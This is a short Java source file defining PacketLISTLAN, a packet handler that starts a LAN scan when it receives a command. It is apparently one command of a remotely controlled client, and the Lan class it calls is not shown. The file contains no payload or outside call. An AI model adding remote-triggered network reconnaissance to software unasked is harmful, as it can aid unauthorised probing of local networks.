package com.redpois0n.packets;

import com.redpois0n.Lan;

public class PacketLISTLAN extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		new Lan().start();
	}

}
